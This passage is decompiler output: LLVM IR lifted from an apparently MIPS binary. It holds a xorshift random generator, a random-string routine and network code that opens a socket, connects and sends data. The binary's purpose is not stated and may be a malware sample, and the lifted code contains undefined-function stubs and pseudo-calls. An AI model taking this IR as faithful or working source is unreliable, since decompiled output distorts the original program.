  %v2_401c88 = icmp eq i32 %v2_401c78, 4
  store i32 %v2_40187c, i32* %v0.global-to-local, align 4
  br i1 %v2_401c88, label %dec_label_pc_401c98.thread, label %dec_label_pc_401ca0

dec_label_pc_401c98.thread:                       ; preds = %dec_label_pc_401c84
  store i32 %v2_401880, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_401cd4

dec_label_pc_401c98:                              ; preds = %dec_label_pc_401c54
  %v1_401c98 = icmp eq i32 %v7_401c64, 0
  br i1 %v1_401c98, label %dec_label_pc_401ca0, label %dec_label_pc_401cd4

dec_label_pc_401ca0:                              ; preds = %dec_label_pc_401bf8, %dec_label_pc_401c98, %dec_label_pc_401c84
  %v3_401ca4 = load i32, i32* @global_var_449a6c.60, align 4
  store i32 %v3_401ca4, i32* @t9, align 4
  %v3_401ca8 = load i32, i32* @global_var_449828.107, align 4
  %v2_401cac = call i32 @function_404d20(i32 %v3_401ca8)
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  store i32 -1, i32* @v0, align 4
  %v3_401cbc = load i32, i32* @global_var_449c00.77, align 4
  store i32 %v3_401cbc, i32* @t9, align 4
  store i32 -1, i32* @global_var_449828.107, align 4
  %v2_401cc4 = call i32 @function_4068f0(i32 1)
  store i32 %v2_401cc4, i32* %v0.global-to-local, align 4
  %v0_401cd4.pre = load i32, i32* @gp, align 4
  br label %dec_label_pc_401cd4

dec_label_pc_401cd4:                              ; preds = %dec_label_pc_401c98.thread, %dec_label_pc_401c98, %dec_label_pc_401ca0
  %v0_401cd4 = phi i32 [ %v2_40151c, %dec_label_pc_401c98 ], [ %v0_401cd4.pre, %dec_label_pc_401ca0 ], [ %v2_40151c, %dec_label_pc_401c98.thread ]
  %v1_401cd4 = add i32 %v0_401cd4, -32076
  %v2_401cd4 = inttoptr i32 %v1_401cd4 to i32*
  %v3_401cd4 = load i32, i32* %v2_401cd4, align 4
  store i32 %v4_401964, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401cd4)
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401cec = load i32, i32* @global_var_449828.107, align 4
  %v3_401cf0 = load i32, i32* @global_var_449c64.110, align 4
  store i32 %v3_401cf0, i32* @t9, align 4
  %v3_401cf4 = load i16, i16* %stack_var_-1384, align 2
  %v4_401cf4 = sext i16 %v3_401cf4 to i32
  %v0_401cf8 = load i32, i32* @s0, align 4
  store i32 %v0_401cf8, i32* %a1.global-to-local, align 4
  %v6_401cfc = inttoptr i32 %v0_401cf8 to i32*
  %v7_401cfc = call i32 @function_405d90(i32 %v3_401cec, i32* %v6_401cfc, i32 %v4_401cf4, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_401cfc, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401d0c

dec_label_pc_401d0c:                              ; preds = %dec_label_pc_4016a4, %dec_label_pc_401cd4
  %v4_401d2c = phi i32 [ 0, %dec_label_pc_4016a4 ], [ %v7_401cfc, %dec_label_pc_401cd4 ]
  store i32 %v0_40153c, i32* %s1.global-to-local, align 4
  ret i32 %v4_401d2c

; uselistorder directives
  uselistorder i32 %v1_401bac, { 1, 0, 3, 2 }
  uselistorder i32 %v3_401b04, { 1, 0 }
  uselistorder i32 %v1_401a88, { 1, 0 }
  uselistorder i32 %v3_401b88.pre, { 1, 2, 0 }
  uselistorder i32 %v1_4019a4, { 1, 0 }
  uselistorder i32 %v3_401958, { 1, 2, 0, 3 }
  uselistorder i32 %v1_40189c, { 1, 2, 0 }
  uselistorder i32 %v1_401888, { 0, 2, 3, 1 }
  uselistorder i32 %v4_401964, { 4, 5, 6, 0, 7, 1, 3, 2, 8 }
  uselistorder i32 %v2_40187c, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_401788, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_40151c, { 42, 0, 1, 41, 44, 43, 40, 39, 49, 48, 47, 46, 50, 45, 38, 2, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 51 }
  uselistorder i32* %stack_var_-1364, { 1, 0, 2 }
  uselistorder i16* %stack_var_-1384, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14 }
  uselistorder i32* %v0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 50, 51, 52, 53, 54, 55, 56, 13, 14, 15, 16, 17, 18, 20, 19, 29, 22, 21, 23, 24, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 38, 39, 40, 41, 8, 13, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %a1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 22, 0 }
  uselistorder i32 16386, { 1, 2, 0 }
  uselistorder i32* @global_var_449828.107, { 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 1 }
  uselistorder i8* @global_var_449cbc.104, { 2, 1, 0 }
  uselistorder i32 ()* @function_404448, { 1, 0 }
  uselistorder [2 x i8]* @global_var_4084b8.71, { 1, 0 }
  uselistorder label %dec_label_pc_401d0c, { 1, 0 }
  uselistorder label %dec_label_pc_401cd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_401ca0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_401c54, { 1, 0 }
  uselistorder label %dec_label_pc_401c28, { 1, 0 }
  uselistorder label %dec_label_pc_401b88, { 1, 0 }
  uselistorder label %dec_label_pc_401afc, { 1, 0 }
  uselistorder label %dec_label_pc_401aa0, { 1, 0 }
  uselistorder label %dec_label_pc_401990, { 1, 0 }
  uselistorder label %dec_label_pc_401954, { 1, 0 }
  uselistorder label %dec_label_pc_4016a4, { 1, 0 }
}

define i32 @function_401d34() local_unnamed_addr {
dec_label_pc_401d34:
  %v3_401d40 = load i32, i32* @global_var_4499c8.2, align 4
  %v3_401d48 = load i32, i32* @global_var_449cc0.111, align 4
  %v3_401d4c = load i32, i32* @global_var_449ccc.112, align 4
  store i32 %v3_401d40, i32* @a3, align 4
  %v1_401d58 = mul i32 %v3_401d48, 2048
  %v1_401d5c = udiv i32 %v3_401d4c, 524288
  %v2_401d60 = xor i32 %v1_401d58, %v3_401d48
  %v2_401d64 = xor i32 %v1_401d5c, %v3_401d4c
  %v2_401d68 = xor i32 %v2_401d64, %v2_401d60
  %v3_401d6c = load i32, i32* @global_var_449cc4.113, align 4
  %v3_401d70 = load i32, i32* @global_var_449cc8.114, align 4
  %v1_401d74 = udiv i32 %v2_401d60, 256
  %v2_401d78 = xor i32 %v2_401d68, %v1_401d74
  store i32 %v3_401d6c, i32* @global_var_449cc0.111, align 4
  store i32 %v3_401d70, i32* @global_var_449cc4.113, align 4
  store i32 %v3_401d4c, i32* @global_var_449cc8.114, align 4
  store i32 %v2_401d78, i32* @global_var_449ccc.112, align 4
  ret i32 %v2_401d78

; uselistorder directives
  uselistorder i32 %v2_401d78, { 1, 0 }
  uselistorder i32 %v3_401d4c, { 2, 1, 0 }
  uselistorder i32 %v3_401d48, { 1, 0 }
}

define i32 @function_401d90(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_401d90:
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_401da4 = load i32, i32* @s3, align 4
  store i32 %tmp, i32* %s2.global-to-local, align 4
  store i32 %arg2, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_401dc4

dec_label_pc_401dc4:                              ; preds = %dec_label_pc_401dc4, %dec_label_pc_401d90
  %v1_401dc4 = call i32 @function_401d34()
  store i32 %v1_401dc4, i32* @v0, align 4
  %v2_401ddc = call i32 @function_403e84()
  %v5_401de4 = urem i32 %v1_401dc4, %v2_401ddc
  %v0_401df0 = load i32, i32* @s3, align 4
  %v1_401df0 = add i32 %v0_401df0, -26580
  %v2_401dfc = add i32 %v1_401df0, %v5_401de4
  %v1_401e00 = inttoptr i32 %v2_401dfc to i8*
  %v2_401e00 = load i8, i8* %v1_401e00, align 1
  %v2_401e08 = load i32, i32* %s2.global-to-local, align 4
  %v3_401e08 = inttoptr i32 %v2_401e08 to i8*
  store i8 %v2_401e00, i8* %v3_401e08, align 1
  %v0_401e0c = load i32, i32* %s2.global-to-local, align 4
  %v1_401e0c = add i32 %v0_401e0c, 1
  store i32 %v1_401e0c, i32* %s2.global-to-local, align 4
  %v0_401e10 = load i32, i32* %s1.global-to-local, align 4
  %v1_401e10 = add i32 %v0_401e10, -1
  store i32 %v1_401e10, i32* %s1.global-to-local, align 4
  %v3_401e18 = load i32, i32* @global_var_449bc4.100, align 4
  store i32 %v3_401e18, i32* @t9, align 4
  %v3_401e1c = load i32, i32* @global_var_4499c8.2, align 4
  store i32 %v3_401e1c, i32* @s3, align 4
  %v2_401e20 = icmp eq i32 %v0_401e10, 0
  br i1 %v2_401e20, label %dec_label_pc_401e24, label %dec_label_pc_401dc4

dec_label_pc_401e24:                              ; preds = %dec_label_pc_401dc4
  store i32 %v0_401da4, i32* @s3, align 4
  ret i32 -1
}

define i32 @function_401e44() local_unnamed_addr {
dec_label_pc_401e44:
  %v3_401e64 = load i32, i32* @global_var_449b18.115, align 4
  store i32 %v3_401e64, i32* @t9, align 4
  %v3_401e6c = call i32 @function_4051f0(i32* null)
  %v3_401e80 = load i32, i32* @global_var_449c34.116, align 4
  store i32 %v3_401e80, i32* @t9, align 4
  store i32 %v3_401e6c, i32* @global_var_449cc0.111, align 4
  %v5_401e88 = call i32 @function_404e30()
  %v3_401e98 = load i32, i32* @global_var_449b1c.117, align 4
  store i32 %v3_401e98, i32* @t9, align 4
  store i32 %v5_401e88, i32* @s0, align 4
  %v2_401ea0 = call i32 @function_404e90()
  %v0_401eac = load i32, i32* @s0, align 4
  %v2_401eac = xor i32 %v0_401eac, %v2_401ea0
  %v3_401eb0 = load i32, i32* @global_var_449a90.118, align 4
  store i32 %v3_401eb0, i32* @t9, align 4
  store i32 %v2_401eac, i32* @global_var_449cc4.113, align 4
  %v5_401eb8 = call i32 @function_405700()
  %v3_401ec4 = load i32, i32* @global_var_449cc4.113, align 4
  %v2_401ecc = xor i32 %v3_401ec4, %v5_401eb8
  store i32 %v2_401ecc, i32* @global_var_449ccc.112, align 4
  store i32 %v5_401eb8, i32* @global_var_449cc8.114, align 4
  ret i32 %v5_401eb8

; uselistorder directives
  uselistorder i32 %v5_401eb8, { 1, 2, 0 }
}

define i32 @function_401ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_401ef4:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s7.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp28 = call i8 @__decompiler_undefined_function_1()
  %tmp29 = call i8 @__decompiler_undefined_function_1()
  %tmp30 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp32 = call i16 @__decompiler_undefined_function_2()
  %tmp33 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-2064 = alloca i32, align 4
  %stack_var_-2065 = alloca i32, align 4
  %stack_var_-2075 = alloca i8, align 1
  %stack_var_-2077 = alloca i32, align 4
  %stack_var_-2082 = alloca i32, align 4
  %stack_var_-2084 = alloca i32, align 4
  %stack_var_-2096 = alloca i16, align 2
  %stack_var_-4296 = alloca i32, align 4
  %stack_var_-4272 = alloca i32, align 4
  %stack_var_-4288 = alloca i32, align 4
  %stack_var_-4144 = alloca i16, align 2
  %stack_var_-4132 = alloca i32, align 4
  %v1_401efc = load i32, i32* @t9, align 4
  %v2_401efc = add i32 %v1_401efc, 326332
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v0_401f04 = load i32, i32* @ra, align 4
  %v0_401f08 = load i32, i32* @fp, align 4
  %v0_401f24 = load i32, i32* @s1, align 4
  %v0_401f28 = load i32, i32* @s0, align 4
  store i32 %arg1, i32* %s2.global-to-local, align 4
  %v2_401f38 = call i32 @function_403e84()
  store i32 %v2_401f38, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  store i32 %v2_401f38, i32* %s0.global-to-local, align 4
  %v3_401f48 = load i32, i32* @global_var_449b00.119, align 4
  store i32 %v3_401f48, i32* @t9, align 4
  %v3_401f50 = ptrtoint i32* %stack_var_-4132 to i32
  store i32 %v3_401f50, i32* %s5.global-to-local, align 4
  %v4_401f50 = call i32 @function_4043e8()
  store i32 %v4_401f50, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v2_401f60 = ptrtoint i16* %stack_var_-4144 to i32
  store i32 %v3_401f50, i32* %a3.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 46, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_401f78

dec_label_pc_401f78:                              ; preds = %dec_label_pc_401fbc.dec_label_pc_401f78_crit_edge, %dec_label_pc_401ef4
  %v2_401f88 = phi i32 [ %v2_401f8811, %dec_label_pc_401fbc.dec_label_pc_401f78_crit_edge ], [ %v3_401f50, %dec_label_pc_401ef4 ]
  %v4_401f80 = phi i32 [ %v4_401f809, %dec_label_pc_401fbc.dec_label_pc_401f78_crit_edge ], [ 0, %dec_label_pc_401ef4 ]
  %v3_401f80 = phi i32 [ %v1_401fbc, %dec_label_pc_401fbc.dec_label_pc_401f78_crit_edge ], [ 0, %dec_label_pc_401ef4 ]
  %v1_401f80 = phi i32 [ %v1_401f80.pre, %dec_label_pc_401fbc.dec_label_pc_401f78_crit_edge ], [ 46, %dec_label_pc_401ef4 ]
  %v0_401f78 = phi i32 [ %v4_401fc4, %dec_label_pc_401fbc.dec_label_pc_401f78_crit_edge ], [ %v4_401f50, %dec_label_pc_401ef4 ]
  %v1_401f78 = inttoptr i32 %v0_401f78 to i8*
  %v2_401f78 = load i8, i8* %v1_401f78, align 1
  %v3_401f78 = sext i8 %v2_401f78 to i32
  %v2_401f80 = icmp eq i32 %v3_401f78, %v1_401f80
  %v5_401f80 = sub i32 %v3_401f80, %v4_401f80
  store i32 %v5_401f80, i32* %v0.global-to-local, align 4
  br i1 %v2_401f80, label %dec_label_pc_401f84, label %dec_label_pc_401fbc

dec_label_pc_401f84:                              ; preds = %dec_label_pc_401f78
  %v1_401f88 = trunc i32 %v5_401f80 to i8
  %v3_401f88 = inttoptr i32 %v2_401f88 to i8*
  store i8 %v1_401f88, i8* %v3_401f88, align 1
  %v0_401f8c = load i32, i32* %s2.global-to-local, align 4
  %v1_401f8c = load i32, i32* %a1.global-to-local, align 4
  %v2_401f8c = add i32 %v1_401f8c, %v0_401f8c
  store i32 %v2_401f8c, i32* %a0.global-to-local, align 4
  %v0_401f94 = load i32, i32* %a3.global-to-local, align 4
  %v1_401f94 = add i32 %v0_401f94, 1
  store i32 %v1_401f94, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_401f98

dec_label_pc_401f98:                              ; preds = %dec_label_pc_401f98, %dec_label_pc_401f84
  %v2_401fa0 = phi i32 [ %v1_401fa4, %dec_label_pc_401f98 ], [ %v1_401f94, %dec_label_pc_401f84 ]
  %v0_401f98 = phi i32 [ %v1_401fb0, %dec_label_pc_401f98 ], [ %v2_401f8c, %dec_label_pc_401f84 ]
  %v1_401f98 = add i32 %v0_401f98, -1
  %v2_401f98 = inttoptr i32 %v1_401f98 to i8*
  %v3_401f98 = load i8, i8* %v2_401f98, align 1
  %v3_401fa0 = inttoptr i32 %v2_401fa0 to i8*
  store i8 %v3_401f98, i8* %v3_401fa0, align 1
  %v0_401fa4 = load i32, i32* %a3.global-to-local, align 4
  %v1_401fa4 = add i32 %v0_401fa4, 1
  store i32 %v1_401fa4, i32* %a3.global-to-local, align 4
  %v0_401fa8 = load i32, i32* %a1.global-to-local, align 4
  %v1_401fa8 = load i32, i32* %a2.global-to-local, align 4
  %v2_401fa8 = icmp slt i32 %v0_401fa8, %v1_401fa8
  %v3_401fa8 = zext i1 %v2_401fa8 to i32
  store i32 %v3_401fa8, i32* %v0.global-to-local, align 4
  %v1_401fac = add i32 %v0_401fa8, 1
  store i32 %v1_401fac, i32* %v1.global-to-local, align 4
  %v0_401fb0 = load i32, i32* %a0.global-to-local, align 4
  %v1_401fb0 = add i32 %v0_401fb0, 1
  store i32 %v1_401fb0, i32* %a0.global-to-local, align 4
  store i32 %v1_401fac, i32* %a1.global-to-local, align 4
  br i1 %v2_401fa8, label %dec_label_pc_401f98, label %dec_label_pc_401fbc

dec_label_pc_401fbc:                              ; preds = %dec_label_pc_401f98, %dec_label_pc_401f78
  %v0_401fbc = phi i32 [ %v3_401f80, %dec_label_pc_401f78 ], [ %v1_401fa8, %dec_label_pc_401f98 ]
  %v2_401f8811 = phi i32 [ %v2_401f88, %dec_label_pc_401f78 ], [ %v1_401fa4, %dec_label_pc_401f98 ]
  %v4_401f809 = phi i32 [ %v4_401f80, %dec_label_pc_401f78 ], [ %v1_401fac, %dec_label_pc_401f98 ]
  %v1_401fbc = add i32 %v0_401fbc, 1
  store i32 %v1_401fbc, i32* %a2.global-to-local, align 4
  %v1_401fc0 = load i32, i32* %s0.global-to-local, align 4
  %v2_401fc0 = icmp slt i32 %v1_401fbc, %v1_401fc0
  %v2_401fc4 = load i32, i32* %s2.global-to-local, align 4
  %v4_401fc4 = add i32 %v2_401fc4, %v1_401fbc
  store i32 %v4_401fc4, i32* %v0.global-to-local, align 4
  br i1 %v2_401fc0, label %dec_label_pc_401fbc.dec_label_pc_401f78_crit_edge, label %dec_label_pc_401fc8

dec_label_pc_401fbc.dec_label_pc_401f78_crit_edge: ; preds = %dec_label_pc_401fbc
  %v1_401f80.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_401f78

dec_label_pc_401fc8:                              ; preds = %dec_label_pc_401fbc
  %v3_401fcc = load i32, i32* @global_var_449bc4.100, align 4
  store i32 %v3_401fcc, i32* @t9, align 4
  store i32 %v3_401f50, i32* %v0.global-to-local, align 4
  store i32 0, i32* %stack_var_-4132, align 4
  %v4_401fd4 = call i32 @function_401d34()
  %v5_401fd4 = sext i32 %v4_401fd4 to i64
  %v5_401fe4 = mul nuw nsw i64 %v5_401fd4, 2147516417
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  store i32 %v3_401f50, i32* %a0.global-to-local, align 4
  store i32 -1, i32* %s4.global-to-local, align 4
  store i32 1, i32* %s7.global-to-local, align 4
  %v1_40200024 = udiv i64 %v5_401fe4, 140737488355328
  %v1_402000 = trunc i64 %v1_40200024 to i32
  store i32 %v1_402000, i32* %v1.global-to-local, align 4
  %v3_402004 = add i32 %v1_402000, %v4_401fd4
  %v1_402008 = urem i32 %v3_402004, 65536
  store i32 %v1_402008, i32* @v0, align 4
  %v6_40200c = trunc i32 %v3_402004 to i16
  %v7_40200c = call i32 @function_403e84()
  store i32 %v7_40200c, i32* @v0, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  store i32 %v3_401f50, i32* %a0.global-to-local, align 4
  %v2_402024 = add i32 %v7_40200c, 17
  store i32 %v2_402024, i32* @fp, align 4
  %v3_402024 = call i32 @function_403e84()
  store i32 %v3_402024, i32* @v0, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  %v3_402034 = load i32, i32* @global_var_449bac.120, align 4
  store i32 %v3_402034, i32* @t9, align 4
  store i32 2054, i32* %a1.global-to-local, align 4
  %v1_40203c = load i32, i32* %s5.global-to-local, align 4
  %v3_40203c = add i32 %v1_40203c, %v3_402024
  store i32 %v3_40203c, i32* @s0, align 4
  %v7_40203c = call i32 @function_406330(i64 1, i32 2054)
  store i32 %v7_40203c, i32* %s3.global-to-local, align 4
  store i32 2, i32* %stack_var_-4288, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  store i32 1, i32* %v1.global-to-local, align 4
  store i16 %v6_40200c, i16* %stack_var_-4144, align 2
  %v0_402070 = load i32, i32* @s0, align 4
  %v1_402070 = add i32 %v0_402070, 1
  store i32 %v1_402070, i32* %a0.global-to-local, align 4
  store i32 16, i32* %v0.global-to-local, align 4
  %v4_402080 = inttoptr i32 %v1_402070 to i16*
  store i16 16, i16* %v4_402080, align 2
  %v0_402084 = load i32, i32* %v1.global-to-local, align 4
  %v1_402084 = trunc i32 %v0_402084 to i16
  %v2_402084 = load i32, i32* %a0.global-to-local, align 4
  %v3_402084 = add i32 %v2_402084, 2
  %v4_402084 = inttoptr i32 %v3_402084 to i16*
  store i16 %v1_402084, i16* %v4_402084, align 2
  store i32 -1, i32* @s0, align 4
  %v0_40208c = load i32, i32* %s4.global-to-local, align 4
  %v2_40208c = icmp eq i32 %v0_40208c, -1
  br i1 %v2_40208c, label %dec_label_pc_4020ac, label %dec_label_pc_402090

dec_label_pc_402090:                              ; preds = %dec_label_pc_401fc8
  %v3_402094 = load i32, i32* @global_var_449a6c.60, align 4
  store i32 %v3_402094, i32* @t9, align 4
  store i32 %v0_40208c, i32* %a0.global-to-local, align 4
  %v3_40209c = call i32 @function_404d20(i32 %v0_40208c)
  store i32 %v3_40209c, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4020ac

dec_label_pc_4020ac:                              ; preds = %dec_label_pc_401fc8, %dec_label_pc_402090
  %v3_4020ac = load i32, i32* @global_var_449bf4.78, align 4
  store i32 %v3_4020ac, i32* @t9, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  store i32 1, i32* %a1.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v4_4020b8 = call i32 @function_405f50(i32 2, i32 1, i32 0)
  store i32 %v4_4020b8, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v1_4020c4 = load i32, i32* @s0, align 4
  %v2_4020c4 = icmp eq i32 %v4_4020b8, %v1_4020c4
  store i32 %v4_4020b8, i32* %s4.global-to-local, align 4
  br i1 %v2_4020c4, label %dec_label_pc_40210c, label %dec_label_pc_4020c8

dec_label_pc_4020c8:                              ; preds = %dec_label_pc_4020ac
  %v3_4020cc = load i32, i32* @global_var_449c60.86, align 4
  store i32 %v3_4020cc, i32* @t9, align 4
  store i32 %v4_4020b8, i32* %a0.global-to-local, align 4
  %v2_4020d4 = ptrtoint i32* %stack_var_-4288 to i32
  store i32 %v2_4020d4, i32* %a1.global-to-local, align 4
  store i32 16, i32* @a2, align 4
  %v4_4020d8 = bitcast i32* %stack_var_-4288 to %sockaddr*
  %v5_4020d8 = call i32 @function_405bf0(i32 %v4_4020b8, %sockaddr* %v4_4020d8)
  store i32 %v5_4020d8, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v1_4020e4 = load i32, i32* @s0, align 4
  %v2_4020e4 = icmp eq i32 %v5_4020d8, %v1_4020e4
  %v3_4020e4 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v3_4020e4, i32* %a0.global-to-local, align 4
  br i1 %v2_4020e4, label %dec_label_pc_40210c, label %dec_label_pc_4020e8

dec_label_pc_4020e8:                              ; preds = %dec_label_pc_4020c8
  %v3_4020ec = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_4020ec, i32* @t9, align 4
  store i32 %v2_401f60, i32* %a1.global-to-local, align 4
  %v0_4020f4 = load i32, i32* @fp, align 4
  store i32 %v0_4020f4, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_4020f8 = bitcast i16* %stack_var_-4144 to i32*
  %v7_4020f8 = call i32 @function_405e70(i32 %v3_4020e4, i32* %v6_4020f8, i32 %v0_4020f4, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_4020f8, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v1_402104 = load i32, i32* @fp, align 4
  %v2_402104 = icmp eq i32 %v7_4020f8, %v1_402104
  store i32 3, i32* @a1, align 4
  br i1 %v2_402104, label %dec_label_pc_402128, label %dec_label_pc_40210c

dec_label_pc_40210c:                              ; preds = %dec_label_pc_4020e8, %dec_label_pc_4020c8, %dec_label_pc_4020ac
  %v1_40210c = add i32 %v1_401efc, 294156
  %v2_40210c = inttoptr i32 %v1_40210c to i32*
  %v3_40210c = load i32, i32* %v2_40210c, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40210c)
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  %v0_402124 = load i32, i32* %s7.global-to-local, align 4
  %v1_402124 = add i32 %v0_402124, 1
  store i32 %v1_402124, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402128

dec_label_pc_402128:                              ; preds = %dec_label_pc_4020e8, %dec_label_pc_40210c
  %v3_402128 = load i32, i32* @global_var_449a74.80, align 4
  store i32 %v3_402128, i32* @t9, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v1_402130 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v1_402130, i32* @a0, align 4
  %v2_402130 = call i32 @function_404bc0()
  store i32 %v2_402130, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  store i32 4, i32* @a1, align 4
  %v3_402140 = load i32, i32* @global_var_449a74.80, align 4
  store i32 %v3_402140, i32* @t9, align 4
  %v0_402144 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_402144, i32* @a0, align 4
  %v2_402148 = or i32 %v2_402130, 128
  store i32 %v2_402148, i32* %a2.global-to-local, align 4
  %v3_402148 = call i32 @function_404bc0()
  %v2_402150 = ptrtoint i32* %stack_var_-4272 to i32
  store i32 %v2_402150, i32* %a1.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
  store i32 %v2_402150, i32* %v0.global-to-local, align 4
  store i32 %v2_401f60, i32* %v1.global-to-local, align 4
  %v5_402168 = ptrtoint i32* %stack_var_-4296 to i32
  br label %dec_label_pc_402160

dec_label_pc_402160:                              ; preds = %dec_label_pc_402160, %dec_label_pc_402128
  %v0_402160 = phi i32 [ %v1_402164, %dec_label_pc_402160 ], [ %v2_402150, %dec_label_pc_402128 ]
  %v1_402160 = inttoptr i32 %v0_402160 to i32*
  store i32 0, i32* %v1_402160, align 4
  %v0_402164 = load i32, i32* %v0.global-to-local, align 4
  %v1_402164 = add i32 %v0_402164, 4
  store i32 %v1_402164, i32* %v0.global-to-local, align 4
  %v1_402168 = load i32, i32* %v1.global-to-local, align 4
  %v2_402168 = icmp eq i32 %v1_402164, %v1_402168
  store i32 %v5_402168, i32* %a0.global-to-local, align 4
  br i1 %v2_402168, label %dec_label_pc_40216c, label %dec_label_pc_402160

dec_label_pc_40216c:                              ; preds = %dec_label_pc_402160
  %v0_402170 = load i32, i32* %s4.global-to-local, align 4
  %v1_402170 = udiv i32 %v0_402170, 32
  %v1_402174 = mul nuw nsw i32 %v1_402170, 4
  store i32 %v1_402174, i32* %v0.global-to-local, align 4
  %v2_402178 = add i32 %v1_402174, %v5_402168
  store i32 %v2_402178, i32* @s0, align 4
  %v1_40217c = add i32 %v2_402178, 24
  %v2_40217c = inttoptr i32 %v1_40217c to i32*
  %v3_40217c = load i32, i32* %v2_40217c, align 4
  %v1_402180 = urem i32 %v0_402170, 32
  store i32 %v1_402180, i32* %s1.global-to-local, align 4
  %v2_402188 = shl i32 1, %v1_402180
  %v2_40218c = or i32 %v3_40217c, %v2_402188
  store i32 %v2_40218c, i32* %v1.global-to-local, align 4
  %v3_402190 = load i32, i32* @global_var_449bf0.121, align 4
  store i32 %v3_402190, i32* @t9, align 4
  store i32 10, i32* %v0.global-to-local, align 4
  store i32 %v2_40218c, i32* %v2_40217c, align 4
  %v0_40219c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_40219c, i32* %stack_var_-4296, align 4
  %v0_4021a8 = load i32, i32* %s4.global-to-local, align 4
  %v1_4021a8 = add i32 %v0_4021a8, 1
  store i32 %v1_4021a8, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a3.global-to-local, align 4
  %v4_4021b0 = call i32 @function_405110(i32 %v1_4021a8, i32 0, i32 0)
  store i32 %v4_4021b0, i32* %v1.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v2_401efc, i32* %gp.global-to-local, align 4
